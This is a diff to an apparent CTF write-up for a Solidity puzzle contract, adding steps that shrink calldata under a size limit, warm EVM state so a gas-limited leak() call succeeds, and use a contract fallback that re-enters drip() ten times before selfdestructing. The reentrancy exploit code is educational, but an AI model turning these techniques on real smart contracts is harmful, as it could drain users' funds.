@@ -314,7 +314,19 @@ constructor(PuzzleBox _puzzle) {
 }
 ```
 
-Success, yet going back to call the now-unlocked function still causes a revert! A closer look at the ```torch()``` implementation informs us why: the ```maxCallDataSize(300)``` modifier.
+Success, yet going back to call the now-unlocked function still causes a revert! A closer look at the ```torch()``` implementation informs us why: the ```maxCallDataSize(300)``` modifier. Since there are a bunch of other functions in the CTF that result in ```burnDripId()``` being called on specific ```dripIds```, let's subtract those ids from the array in the expectation of calling those functions directly later on. This leaves us with the following array:
+
+```
+uint256[] memory torchees = new uint256[](6);
+        torchees[0] = 2; 
+        torchees[1] = 4;
+        torchees[2] = 6;
+        torchees[3] = 7;
+        torchees[4] = 8;
+        torchees[5] = 9;
+```
+
+Even when calling this smaller array, ```torch()``` still reverts and complains about calldatasize: we've slimmed it down to 320 bytes but need to somehow get it under 300.
 
 ## This is where I ran out of time
 
@@ -332,7 +344,7 @@ Here's the final calldata of 289 byte length that will pass the ```maxCallDataSi
 
 ##### Take note of the extra 0x00 byte hanging off the edge of the above calldata's first line, I'll explain it in a moment.
 
-The above calldata can be 'manually' constructed using Solidity like this:
+The above calldata can be 'manually' constructed using Solidity like this (in ```solve()```):
 
 ```
 (bool r,) = proxy.call(abi.encodePacked(
@@ -363,10 +375,90 @@ Here's the flow of the decoder in its entirety:
 10. Continue to the next 32 byte word, which is the value of the fifth element within the torchees array: 0x08
 11. Continue to the next 32 byte word, which is the value of the sixth and final element within the torchees array: 0x09
 
-In short, by reusing 31 of the first 33 bytes in the payload to obtain the offset as well as the total argument length, we save enough ```CALLDATASIZE``` to pass the modifier on ```torch()```
+In short, by reusing 31 of the payload's first 33 bytes in step 3 to obtain the offset as well as the total argument length, we save enough ```CALLDATASIZE``` to pass the modifier on ```torch()```
 
-##### Huge thanks to Lawrence Forman [@merklejerk on Twitter](https://twitter.com/merklejerk) who took the time to personally bolster my understanding of this challenge (in his own CTF!)
+##### Huge thanks to Lawrence Forman [@merklejerk on Twitter](https://twitter.com/merklejerk) who took the time to personally bolster my understanding of this challenge
 
+## Burning the rest of the drips 
+
+Now that we're left with only the three ```dripIds``` (1, 3, 10) that can be burned using ```zip()```, ```spread()```, and ```creep()```, that's pretty clearly our next course of action. We'll by putting a call to ```zip()``` in our solve function:
+
+```puzzle.zip()```
+
+Alas, we're met with an 'OutOfGas' revert, caused by the gas constrained call to ```leak()```. However, looking at the implementation of ```leak()``` below:
+
+```
+function leak()
+        external
+    {
+        unchecked {
+            payable(address(uint160(address(this)) + uint160(++leakCount))).transfer(1);
+        }
+    }
+```
+
+a state-warming gas optimization can be performed! The EVM charges drastically higher gas costs when manipulating account balance state on 'cold' addresses than for subsequent changes to previously accessed 'warm' addresses within the same transaction. This means we just need to warm up the state on the address that will receive the leaked wei when ```zip()``` is called. Let's do so by adding another function that warms up state and then cleans up our EoaSpoof contract with selfdestruct, as well as an if condition block in the EoaSpoof fallback that invokes said function on the final reentry:
+
+```
+function destro(address puzl, address solution) external {
+    payable(address(uint160(puzl) + uint160(1))).call{ value:1 }('');
+    selfdestruct(payable(solution));
+}
+
+// fallback accepts drained ETH and exploits reentrancy vulnerability in puzzle's drip()
+fallback() external payable {
+    ++reentranceCounter;
+
+    // reenter 10 times to raise lastDripId to 10
+    if (reentranceCounter < 10) {
+        puzzle.drip{ value: 101 }();
+    }
+
+    // on last reentry
+    if (reentranceCounter == 10) {            
+        ++reentranceCounter;
+        
+        this.destro(msg.sender, tx.origin);
+    }
+}
+```
+
+## Doh! We forgot about the SLOAD opcode from reading ```++leakCount```!
+
+After making the above changes to the EoaSpoof contract, the call to ```leak()``` still reverts! What gives?! We warmed up state on all the relevant addresses so the gas cost should now be low enough to succeed... Except we forgot about making an SLOAD opcode call on a non-warm storage slot like ```leakCount``` costs a whopping 2100 gas, as opposed to a cheap 100 gas if the slot is warm.
+
+So we need to make a few edits to the above code in order to first warm up the ```leakCount``` storage slot so the call to ```leak()``` is gas efficient enough to succeed. The most foolproof way to warm up all relevant slots in a function call is simply by performing the function call twice! So in our code changes above we add a call to ```leak()``` directly and then make an adjustment in the low level call's uint160 arithmetic to match the incremented state of ```leakCount```:
+
+```
+function destro(address puzl, address solution) external {
+    puzzle.leak();
+    payable(address(uint160(puzl) + uint160(2))).call{ value: 1 }(''); // uint160(2) == uint160(++1)
+    selfdestruct(payable(solution));
+}
+
+// fallback accepts drained ETH and exploits reentrancy vulnerability in puzzle's drip()
+fallback() external payable {
+    ++reentranceCounter;
+
+    // reenter 10 times to raise lastDripId to 10
+    if (reentranceCounter < 10) {
+        puzzle.drip{ value: 101 }();
+    }
+
+    // on last reentry
+    if (reentranceCounter == 10) {            
+        ++reentranceCounter;
+        
+        this.destro(msg.sender, tx.origin);
+    }
+}
+```
+
+Now all relevant state slots and addresses are nice and warm, leading to a successful ```zip()``` invocation as well as the ```burnDripId(1)``` modifier!
+
+## Onto the next dripId to burn: 3
+
+Next up, we'd like to invoke the ```burnDripId(3)``` modifier attached to the ```spread()``` function.
 
 
 
